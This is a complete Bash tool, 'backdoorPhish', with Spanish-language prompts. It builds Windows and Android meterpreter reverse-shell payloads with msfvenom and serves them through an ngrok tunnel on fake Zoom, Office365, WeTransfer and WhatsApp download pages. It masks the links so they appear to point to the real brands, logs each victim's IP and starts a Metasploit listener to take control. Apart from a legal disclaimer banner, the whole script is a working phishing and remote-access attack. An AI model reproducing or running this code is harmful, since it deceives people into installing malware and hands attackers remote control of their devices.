#!/bin/bash

#By @m4lal0

# Regular Colors
Black='\033[0;30m'      # Black
Red='\033[0;31m'        # Red
Green='\033[0;32m'      # Green
Yellow='\033[0;33m'     # Yellow
Blue='\033[0;34m'       # Blue
Purple='\033[0;35m'     # Purple
Cyan='\033[0;36m'       # Cyan
White='\033[0;97m'      # White
Blink='\033[5m'         # Blink
Color_Off='\033[0m'     # Text Reset

# Additional colors
LGray='\033[0;90m'      # Ligth Gray
LRed='\033[0;91m'       # Ligth Red
LGreen='\033[0;92m'     # Ligth Green
LYellow='\033[0;93m'    # Ligth Yellow
LBlue='\033[0;94m'      # Ligth Blue
LPurple='\033[0;95m'    # Light Purple
LCyan='\033[0;96m'      # Ligth Cyan

# Bold
BBlack='\033[1;30m'     # Black
BGray='\033[1;37m'		# Gray
BRed='\033[1;31m'       # Red
BGreen='\033[1;32m'     # Green
BYellow='\033[1;33m'    # Yellow
BBlue='\033[1;34m'      # Blue
BPurple='\033[1;35m'    # Purple
BCyan='\033[1;36m'      # Cyan
BWhite='\033[1;37m'     # White

# Italics
IBlack='\033[3;30m'     # Black
IGray='\033[3;90m'      # Gray
IRed='\033[3;31m'       # Red
IGreen='\033[3;32m'     # Green
IYellow='\033[3;33m'    # Yellow
IBlue='\033[3;34m'      # Blue
IPurple='\033[3;35m'    # Purple
ICyan='\033[3;36m'      # Cyan
IWhite='\033[3;37m'     # White

# Underline
UBlack='\033[4;30m'     # Black
UGray='\033[4;37m'		# Gray
URed='\033[4;31m'       # Red
UGreen='\033[4;32m'     # Green
UYellow='\033[4;33m'    # Yellow
UBlue='\033[4;34m'      # Blue
UPurple='\033[4;35m'    # Purple
UCyan='\033[4;36m'      # Cyan
UWhite='\033[4;37m'     # White

# Background
On_Black='\033[40m'     # Black
On_Red='\033[41m'       # Red
On_Green='\033[42m'     # Green
On_Yellow='\033[43m'    # Yellow
On_Blue='\033[44m'      # Blue
On_Purple='\033[45m'    # Purple
On_Cyan='\033[46m'      # Cyan
On_White='\033[47m'     # White

trap ctrl_c INT
readonly BY='By @m4lal0'
VERSION=1.0.1

function stopServices() {
    CHECKNGROK=$(ps aux | grep -o "ngrok" | head -n1)
    CHECKPHP=$(ps aux | grep -o "php" | head -n1)
    if [[ $CHECKNGROK == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi
    if [[ $CHECKPHP == *'php'* ]]; then
        pkill -f -2 php > /dev/null 2>&1
        killall -2 php > /dev/null 2>&1
    fi
}

function ctrl_c(){
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BRed}Saliendo...${Color_Off}\n"
    stopServices
    rm -rf index.php index2.html listener.rc my-release-key.keystore &>/dev/null
    tput cnorm; exit 0
}

function checkRoot(){
    if [ "$EUID" -ne 0 ]; then
        echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BRed}Este script debe ser ejecutado por r00t!${Color_Off}\n"
        tput cnorm; exit 1
    fi
}

function banner(){
    echo -e "\n${BRed}"
    echo -e "\t     (  (     (  (     )  .  (  .  (   (   (   ( (   ((  (  ( (  "
    echo -e "\t    ()) )\   ()) )\   (()  . )\  . )\  )\  )\  )\)\  ))\ )\ )\)\ "
    echo -e "\t   (_)()_() ((_))(_)__)(_)  ((_)  ((_)((_)((_)(_)(_)((_)((_)_)(_)"
    echo -e "\t   | _ )   \/ __| |/ /   \ / _ \ / _ \| _ \ _ \ || |_ _| __| || |"
    echo -e "\t   | _ \ - | (__|   <| |) | (_) | (_) |   /  _/ __ || |\__ \ __ |${IPurple} $BY${Color_Off}"
    echo -e "\t${BRed}   |___/_|_|\___|_|\_\___/ \___/ \___/|_|_\_| |_||_|___|___/_||_|${Color_Off}"
    echo -e "\t${On_Red}${BWhite}[!!] Atacar objetivos sin consentimiento mutuo previo es ILEGAL [!!]${Color_Off}"
    echo -e "\t${On_Red}${BWhite}[!!] El desarrollador no es responsables de ningún daño causado [!!]${Color_Off}"
    echo -e "\t${On_Red}${BWhite}[!!] por este script.                                           [!!]${Color_Off}\n"
}

function dependencies(){
    tput civis; clear; banner
    dependencies=(php unzip curl wget keytool jarsigner jq)
    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Comprobando herramientas necesarias:${Color_Off}\n"
    for program in "${dependencies[@]}"; do
        echo -ne "${LBlue}[${BBlue}*${LBlue}] ${BWhite}Herramienta $program...${Color_Off}"
        command -v $program > /dev/null 2>&1
        if [ "$(echo $?)" == "0" ]; then
            echo -e "${LBlue}($BGreen✔${LBlue})${Color_Off}"
        else
            echo -e "${LBlue}(${BRed}✘${LBlue})${Color_Off}"
            echo -ne "${LBlue}[${BYellow}!${LBlue}] ${BYellow}Instalando ${IYellow}$program...${Color_Off}"
            apt-get install $program -y > /dev/null 2>&1
            if [ $? -ne 0 ]; then 
                echo -e "${LCyan}(${Bred}✘${LCyan})${Color_Off}"
                echo -e "${IRed}Error al instalar $program...${Color_off}\n"
                exit 1
            else
                echo -e "${LCyan}(${BGreen}✔${LCyan})${Color_Off}"
            fi
        fi; sleep 1
    done
    if [[ ! -e ngrok ]]; then
        echo -ne "${LCyan}[${BYellow}!${LCyan}] ${BYellow}Instalando ${IYellow}ngrok...${Color_Off}"
        wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
        if [[ -e ngrok-stable-linux-386.zip ]]; then
            unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok-stable-linux-386.zip
            echo -e "${LCyan}(${BGreen}✔${LCyan})${Color_Off}"
        else
            echo -e "${LCyan}(${Bred}✘${LCyan})${Color_Off}"
            echo -e "${IRed}Error al instalar Ngrok...${Color_off}\n"
            exit 1
        fi
    else
        echo -e "${LBlue}[${BBlue}*${LBlue}] ${BWhite}Herramienta ngrok...${LBlue}($BGreen✔${LBlue})${Color_Off}"
    fi
    if [[ -e logs/ip.txt ]]; then
        rm -rf logs/ip.txt 2>/dev/null
    fi
    if [[ -e logs/info.json ]]; then
        rm -rf logs/info.json 2>/dev/null
    fi
    if [[ ! -e *.exe ]]; then
        rm -rf *.exe 2>/dev/null
    fi
    if [[ ! -e *.apk ]]; then
        rm -rf *.apk 2>/dev/null
    fi
    if [[ ! -e templates/zoom.html ]]; then
        echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}No existe plantilla Zoom${Color_Off}"
        echo -e "${IWhite}Descargue la herramienta nuevamente...${Color_Off}"
        tput cnorm; exit 1
    fi
    if [[ ! -e templates/office.html ]]; then
        echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}No existe plantilla Microsoft Office${Color_Off}"
        echo -e "${IWhite}Descargue la herramienta nuevamente...${Color_Off}"
        tput cnorm; exit 1
    fi
    if [[ ! -e templates/whatsapp.html ]]; then
        echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}No existe plantilla Whatsapp${Color_Off}"
        echo -e "${IWhite}Descargue la herramienta nuevamente...${Color_Off}"
        tput cnorm; exit 1
    fi
    if [[ ! -e templates/wetransfer.html ]]; then
        echo -e "\n${LBlue}[${BRed}✘${LBlue}] ${BRed}No existe plantilla Wetransfer${Color_Off}"
        echo -e "${IWhite}Descargue la herramienta nuevamente...${Color_Off}"
        tput cnorm; exit 1
    fi
    sleep 3
}

function checkUpdate(){
    GIT=$(curl --silent https://github.com/m4lal0/backdoorPhish/blob/main/backdoorPhish.sh | grep 'VERSION=' | cut -d">" -f2 | cut -d"<" -f1 | cut -d"=" -f 2)
    if [[ "$GIT" == "$VERSION" || -z $GIT ]]; then
        echo -e "${BGreen}[✔]${Color_Off} ${BGreen}La versión actual es la más reciente.${Color_Off}\n"
        tput cnorm; exit 0
    else
        echo -e "${Yellow}[*]${Color_Off} ${IWhite}Actualización disponible${Color_Off}"
        echo -e "${Yellow}[*]${Color_Off} ${IWhite}Actualización de la versión${Color_Off} ${BWhite}$VERSION${Color_Off} ${IWhite}a la${Color_Off} ${BWhite}$GIT${Color_Off}"
        update="1"
    fi
}

function installUpdate(){
    echo -en "${Yellow}[*]${Color_Off} ${IWhite}Instalando actualización...${Color_Off}"
    git clone https://github.com/m4lal0/backdoorPhish &>/dev/null
    chmod +x backdoorPhish/backdoorPhish.sh && mv backdoorPhish/templates/* templates &>/dev/null
    mv backdoorPhish/backdoorPhish.sh . &>/dev/null
    mv backdoorPhish/get_ip.php . &>/dev/null
    mv backdoorPhish/info.php . &>/dev/null
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${BGreen}[ OK ]${Color_Off}"
    else
        echo -e "${BRed}[ FAIL ]${Color_Off}"
        tput cnorm && exit 1
    fi
    echo -en "${Yellow}[*]${Color_Off} ${IWhite}Limpiando...${Color_Off}"
    wait
    rm -rf backdoorPhish &>/dev/null
    if [ "$(echo $?)" == "0" ]; then
        echo -e "${BGreen}[ OK ]${Color_Off}"
    else
        echo -e "${BRed}[ FAIL ]${Color_Off}"
        tput cnorm && exit 1
    fi
    echo -e "\n${BGreen}[✔]${Color_Off} ${IGreen}Versión actualizada a${Color_Off} ${BWhite}$GIT${Color_Off}\n"
    tput cnorm && exit 0
}

function startServices(){
    echo -e "\n${Cyan}╔──────────────────────────────────────╗${Color_Off}"
    echo -e "${LBlue}│    [${BBlue}++${LBlue}]${BCyan}  Ejecutar servicios  ${LBlue}[${BBlue}++${LBlue}]    │${Color_Off}"
    echo -e "${Cyan}┖──────────────────────────────────────┙${Color_Off}\n"
    echo -en "${LBlue}[${BBlue}*${LBlue}] ${ICyan}Iniciando servidor PHP...${Color_Off}"
    php -S 127.0.0.1:3333 &>/dev/null &
    if [ $? -eq 0 ]; then
        sleep 3
        echo -e "${LBlue}(${BGreen}✔${LBlue})${Color_Off}"
    else
        sleep 3
        echo -e "${LBlue}(${BRed}✘${LBlue})${Color_Off}"
        exit 1
    fi
    echo -en "${LBlue}[${BBlue}*${LBlue}] ${ICyan}Iniciando servidor Ngrok...${Color_Off}"
    ./ngrok http 3333 &>/dev/null &
    if [ $? -eq 0 ]; then
        sleep 3
        echo -e "${LBlue}(${BGreen}✔${LBlue})${Color_Off}"
    else
        sleep 3
        echo -e "${LBlue}(${BRed}✘${LBlue})${Color_Off}"
        exit 1
    fi

    #URL=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    URL=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq | grep "public_url" | head -n 1 | awk '{print $2}' | grep -oP '\".*?\"' | tr -d '"')
}

function crypted(){
    tput cnorm
    DEFAULT_OPTION_CRYP="y"
    echo -e "\n${BRed}┌─[${BWhite}Quieres cifrar el payload? (y/n)${BRed}]${Color_Off}"
    echo -en "${BRed}└──╼${BGreen} " && read OPTION_CRYP
    echo -e "${Color_Off}"
    OPTION_CRYP="${OPTION_CRYP:-${DEFAULT_OPTION_CRYP}}"
    if [[ $OPTION_CRYP == "y" || $OPTION_CRYP == "Y" ]]; then
        keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $PAYLOAD_NAME.apk alias_name
        if [ $? -eq 0 ]; then
            echo -en "${LBlue}[${BBlue}*${LBlue}] ${ICyan}Configurando el cifrado del payload...${Color_Off}"
            sleep 3
            echo -e "${LBlue}(${BGreen}✔${LBlue})${Color_Off}"
        else
            echo -en "${LBlue}[${BBlue}*${LBlue}] ${ICyan}Configurando el cifrado del payload...${Color_Off}"
            sleep 3
            echo -e "${LBlue}(${BRed}✘${LBlue})${Color_Off}"
        fi
    fi
}

function payload(){
    echo -e "${Cyan}╔────────────────────────────────────────╗${Color_Off}"
    echo -e "${LBlue}|     [${BBlue}++${LBlue}]${BCyan}  Configurar Payload  ${LBlue}[${BBlue}++${LBlue}]     |${Color_Off}"
    echo -e "${Cyan}┖────────────────────────────────────────┙${Color_Off}\n"
    echo -e "${BRed}┌─[${BWhite}IP de tu equipo${BRed}]${Color_Off}"
    echo -en "${BRed}└──╼${BGreen} " && read LHOST
    echo -e "${Color_Off}"
    echo -e "${BRed}┌─[${BWhite}Puerto${BRed}]${Color_Off}"
    echo -en "${BRed}└──╼${BGreen} " && read LPORT
    echo -e "${Color_Off}"
    echo -e "${BRed}┌─[${BWhite}Nombre del Programa${BRed}]${Color_Off}"
    echo -en "${BRed}└──╼${BGreen} " && read PAYLOAD_NAME
    echo -e "${Color_Off}"
    tput civis
    echo -en "${LBlue}[${BBlue}*${LBlue}] ${ICyan}Configurando el payload...${Color_Off}"
    if [[ $OPTION_OS -eq 1 ]]; then
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > $PAYLOAD_NAME.exe 2> /dev/null
    fi
    if [[ $OPTION_OS -eq 2 ]]; then
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > $PAYLOAD_NAME.apk 2> /dev/null
    fi
    if [ $? -eq 0 ]; then
        sleep 3
        echo -e "${LBlue}(${BGreen}✔${LBlue})${Color_Off}"
    else
        sleep 3
        echo -e "${LBlue}(${BRed}✘${LBlue})${Color_Off}"
        exit 1
    fi
    if [[ $OPTION_OS -eq 2 ]]; then
        crypted
        tput civis
    fi
}

function startMsf(){
    echo -e "${LBlue}[${BBlue}*${LBlue}] ${ICyan}Ejecutando un listenner...${Color_Off}\n"
    if [[ $OPTION_OS -eq 1 ]]; then
        echo -e "use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST $LHOST\nset LPORT $LPORT\nexploit" > listener.rc
    fi
    if [[ $OPTION_OS -eq 2 ]]; then
        echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $LHOST\nset LPORT $LPORT\nexploit" > listener.rc
    fi
    msfconsole -r listener.rc
}

function templates(){
    echo -e "${Cyan}╔────────────────────────────────────────╗${Color_Off}"
    echo -e "${LBlue}│  [${BBlue}++${LBlue}]${BCyan}  Configurar plantilla web  ${LBlue}[${BBlue}++${LBlue}]  │${Color_Off}"
    echo -e "${Cyan}┖────────────────────────────────────────┙${Color_Off}\n"

    echo -e "${LBlue}[${Yellow}1${LBlue}] ${Yellow}Zoom${Color_Off}"
    echo -e "${LBlue}[${Yellow}2${LBlue}] ${Yellow}Office365${Color_Off}"
    echo -e "${LBlue}[${Yellow}3${LBlue}] ${Yellow}WeTransfer${Color_Off}"
    echo -e "${LBlue}[${Yellow}4${LBlue}] ${Yellow}WhatsApp${Color_Off}"
    
    echo -e "\n${BRed}┌─[${BWhite}Elegir plantilla (1/2/3/4)${BRed}]${Color_Off}"
    echo -en "${BRed}└──╼${BGreen} " && read OPTION_TEMPLATE
    echo -e "${Color_Off}"

    case $OPTION_TEMPLATE in
        1|2|3|4) ;;
        *) config;;
    esac

    payload
    startServices

    sed 's+forwarding_link+'$URL'+g' templates/template.php > index.php
    if [[ $OPTION_TEMPLATE -eq 1 ]]; then
        SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${URL})
        SHORTER=${SHORT#https://}
        MASK="https://zoom.us"
        WORDS="support-download"
        URLMASK=$MASK-$WORDS@$SHORTER
        if [[ $OPTION_OS -eq 1 ]]; then
            sed 's+forwarding_file+'$PAYLOAD_NAME.exe'+g' templates/zoom.html > index2.html
        fi
        if [[ $OPTION_OS -eq 2 ]]; then
            sed 's+forwarding_file+'$PAYLOAD_NAME.apk'+g' templates/zoom.html > index2.html
        fi
    fi
    if [[ $OPTION_TEMPLATE -eq 2 ]]; then
        SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${URL})
        SHORTER=${SHORT#https://}
        MASK="https://www.microsoft.com"
        WORDS="es-mx-microsoft-365"
        URLMASK=$MASK-$WORDS@$SHORTER
        if [[ $OPTION_OS -eq 1 ]]; then
            sed 's+forwarding_file+'$PAYLOAD_NAME.exe'+g' templates/office.html > index2.html
        fi
        if [[ $OPTION_OS -eq 2 ]]; then
            sed 's+forwarding_file+'$PAYLOAD_NAME.apk'+g' templates/office.html > index2.html
        fi
    fi
    if [[ $OPTION_TEMPLATE -eq 3 ]]; then
        SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${URL})
        SHORTER=${SHORT#https://}
        MASK="https://www.wetransfer.com"
        WORDS="file"
        URLMASK=$MASK-$WORDS@$SHORTER
        if [[ $OPTION_OS -eq 1 ]]; then
            sed 's+forwarding_file+'$PAYLOAD_NAME.exe'+g' templates/wetransfer.html > index2.html
        fi
        if [[ $OPTION_OS -eq 2 ]]; then
            sed 's+forwarding_file+'$PAYLOAD_NAME.apk'+g' templates/wetransfer.html > index2.html
        fi
    fi
    if [[ $OPTION_TEMPLATE -eq 4 ]]; then
        SHORT=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${URL})
        SHORTER=${SHORT#https://}
        MASK="https://www.whatsapp.com"
        WORDS="download"
        URLMASK=$MASK-$WORDS@$SHORTER
        if [[ $OPTION_OS -eq 1 ]]; then
            sed 's+forwarding_file+'$PAYLOAD_NAME.exe'+g' templates/whatsapp.html > index.html
            sed 's+forwarding_link+'$URL/$PAYLOAD_NAME.exe'+g' index.html > index2.html
            rm -rf index.html 2>/dev/null
        fi
        if [[ $OPTION_OS -eq 2 ]]; then
            sed 's+forwarding_file+'$PAYLOAD_NAME.apk'+g' templates/whatsapp.html > index.html
            sed 's+forwarding_link+'$URL/$PAYLOAD_NAME.apk'+g' index.html > index2.html
            rm -rf index.html 2>/dev/null
        fi
    fi

    echo -e "\n\n${LBlue}[${BBlue}+${LBlue}] ${BBlue}URL a proporcionar: ${UWhite}$URLMASK${Color_Off}"

    echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BYellow}Espere a que el objetivo entre a la URL, presione ${Color_Off}${Blink}Ctrl + C${Color_Off} ${BYellow}para salir...${Color_Off}\n"
    while [ true ]; do
		if [[ -e "logs/ip.txt" ]]; then
            echo -e "\n${BGreen}[+] El objetivo entró a la URL! ${Color_Off}\n"
            echo -e "${IWhite}IP de la victima:${Color_Off} ${BWhite}$(head -n1 logs/ip.txt | awk '{print $2}')${Color_Off}"
            echo -e "${IWhite}Se guarda el resultado en el directorio:${Color_Off} ${BWhite}logs${Color_Off}\n"
            tput cnorm; startMsf
		fi
	    sleep 0.5
	done
}

function config(){
    clear; tput cnorm
    banner
    echo -e "${Cyan}╔────────────────────────────────────────╗${Color_Off}"
    echo -e "${LBlue}│  [${BBlue}++${LBlue}]${BCyan} Sistema Operativo Objetivo ${LBlue}[${BBlue}++${LBlue}]  │${Color_Off}"
    echo -e "${Cyan}┖────────────────────────────────────────┙${Color_Off}\n"

    echo -e "${LBlue}[${Yellow}1${LBlue}] ${Yellow}Windows${Color_Off}"
    echo -e "${LBlue}[${Yellow}2${LBlue}] ${Yellow}Android${Color_Off}"
    
    echo -e "\n${BRed}┌─[${BWhite}Elegir el Sistema Operativo del objetivo (1/2)${BRed}]${Color_Off}"
    echo -en "${BRed}└──╼${BGreen} " && read OPTION_OS
    echo -e "${Color_Off}"
    # templates
    case $OPTION_OS in
        1|2) templates;;
        *) config;;
    esac
}

checkRoot
if [ "$(echo $1)" == "--update" ]; then
    clear; banner
    echo -e "${BBlue}[+]${Color_Off} ${BWhite}backdoorPhish Versión $VERSION${Color_Off}"
    echo -e "${BBlue}[+]${Color_Off} ${BWhite}Verificando actualización de backdoorPhish${Color_Off}"
    checkUpdate
    echo -e "\t${BWhite}$VERSION ${IWhite}Versión Instalada${Color_Off}"
    echo -e "\t${BWhite}$GIT ${IWhite}Versión en Git${Color_Off}\n"
    if [ "$update" != "1" ]; then
        tput cnorm && exit 0;
    else
        echo -e "${BBlue}[+]${Color_Off} ${BWhite}Necesita actualizar!${Color_Off}"
        tput cnorm
        echo -en "${BPurple}[?]${Color_Off} ${BCyan}Quiere actualizar? (${BGreen}Y${BCyan}/${BRed}n${BCyan}):${Color_Off} " && read CONDITION
        tput civis
        case "$CONDITION" in
            n|N) echo -e "\n${LBlue}[${BYellow}!${LBlue}] ${BRed}No se actualizo, se queda en la versión ${BWhite}$VERSION${Color_Off}\n" && tput cnorm && exit 0;;
            *) installUpdate;;
        esac
    fi
else
    dependencies
    config
fi